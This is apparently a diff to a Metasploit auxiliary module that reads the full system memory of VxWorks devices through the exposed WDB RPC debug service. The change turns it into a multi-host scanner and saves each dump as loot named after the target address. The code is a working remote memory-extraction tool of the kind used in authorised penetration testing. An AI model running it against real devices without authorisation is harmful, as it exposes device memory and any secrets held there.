@@ -16,6 +16,8 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::WDBRPC_Client
+	include Msf::Auxiliary::Report
+	include Msf::Auxiliary::Scanner
 
 	def initialize(info = {})
 		super(update_info(info,
@@ -40,19 +42,10 @@ class Metasploit3 < Msf::Auxiliary
 			))
 
 		register_options(
-			[
-				OptString.new('LPATH',
-					[
-						true,
-						"The local filename to store the dumped memory",
-						::File.join(Msf::Config.log_directory, "vxworks_memory.dmp")
-					]
-				),
-				OptInt.new('OFFSET', [ true, "The starting offset to read the memory dump (hex allowed)", 0 ])
-			], self.class)
+			[OptInt.new('OFFSET', [ true, "The starting offset to read the memory dump (hex allowed)", 0 ])], self.class)
 	end
 
-	def run
+	def run_host(ip)
 		offset = datastore['OFFSET'].to_i
 		print_status("Attempting to dump system memory, starting at offset 0x%02x" % offset)
 
@@ -69,21 +62,13 @@ class Metasploit3 < Msf::Auxiliary
 
 		print_status("Dumping #{"0x%.8x" % memsize} bytes from base address #{"0x%.8x" % membase} at offset #{"0x%.8x" % offset}...")
 
-		lfd = nil
-		if offset != 0
-			# Turns out ruby's implementation of seek with "ab" mode is all kind of busted.
-			lfd = ::File.open(datastore['LPATH'], "r+b")
-			lfd.seek(offset)
-		else
-			lfd = ::File.open(datastore['LPATH'], "wb")
-		end
 
 		mtu -= 80
 		idx  = offset
 		lpt  = 0.00
 		sts = Time.now.to_f
 
-
+		memory_dump = ""
 		while (idx < memsize)
 			buff = wdbrpc_client_memread(membase + idx, mtu)
 			if not buff
@@ -92,7 +77,7 @@ class Metasploit3 < Msf::Auxiliary
 			end
 
 			idx += buff.length
-			lfd.write(buff)
+			memory_dump << buff
 
 			pct = ((idx / memsize.to_f) * 10000).to_i
 			pct = pct / 100.0
@@ -104,8 +89,9 @@ class Metasploit3 < Msf::Auxiliary
 			end
 		end
 
-		lfd.close
-
+		filename= "#{datastore['RHOST']}_vxworks_memory.dmp"
+		store_loot("host.vxworks.memory.dump", "application/octet-stream", datastore['RHOST'], memory_dump, filename, "VxWorks Memory Dump")
+		
 		print_status("Dumped #{"0x%.8x" % idx} bytes.")
 		wdbrpc_client_disconnect
 	end
